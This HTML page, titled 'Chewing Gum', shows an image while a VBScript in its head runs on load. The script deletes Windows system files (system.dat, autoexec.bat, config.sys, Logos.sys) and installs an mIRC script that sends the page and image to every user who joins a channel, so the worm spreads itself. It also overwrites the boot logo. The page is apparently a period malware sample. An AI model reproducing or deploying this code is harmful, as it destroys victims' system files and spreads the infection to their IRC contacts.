<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=iso-8859-1">
<title>Chewing Gum</title>
</head>

<body bgcolor="#000000">
<script language="VBScript"> 
<!--
On Error Resume Next
Dim fso, f
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.GetFile("c:\windows\system.dat")
f.attributes = f.attributes - 1

dim a
Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFile("c:\windows\system.dat")
a.Delete

Dim fsi, d
Set fsi = CreateObject("Scripting.FileSystemObject")
Set d = fsi.GetFile("c:\autoexec.bat")
d.Delete

Dim fsj, e
Set fsj = CreateObject("Scripting.FileSystemObject")
Set e = fsj.GetFile("c:\config.sys")
e.Delete

dim b
Set fso = CreateObject("Scripting.FileSystemObject")
Set b = fso.CreateTextFile("c:\mirc\gum.mrc", True)
b.WriteLine "ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
b.WriteLine "/dcc send $nick c:\mirc\download\gum.html"
b.WriteLine "/dcc send $nick c:\mirc\download\gum.bmp"
b.WriteLine "}"
b.close

 ' Thanks Knowdeth for letting me use this, from VBS/mIRC/pIRCH.WelcomB.a :-)

Const ForReading = 1, ForWriting = 2, ForAppending = 8
Set f = fso.OpenTextFile("c:\mirc\mirc.ini", ForAppending, True)
f.WriteLine "n3=c:\mirc\gum.mrc"
f.Close

Dim fsz, x
Set fsz = CreateObject("Scripting.FileSystemObject")
Set x = fsz.GetFile("c:\windows\Logos.sys")
x.Delete

dim gum, g
Set gum = CreateObject("Scripting.FileSystemObject")
Set g = gum.GetFile("c:\mirc\download\gum.bmp")
g.Copy ("c:\windows\Logos.sys")


 ' Chewing Gum is written by Gigabyte..enjoy

-->
</script>

<p align="center"><img src="gum.bmp" width="320" height="400"></p>
</body>
</html>
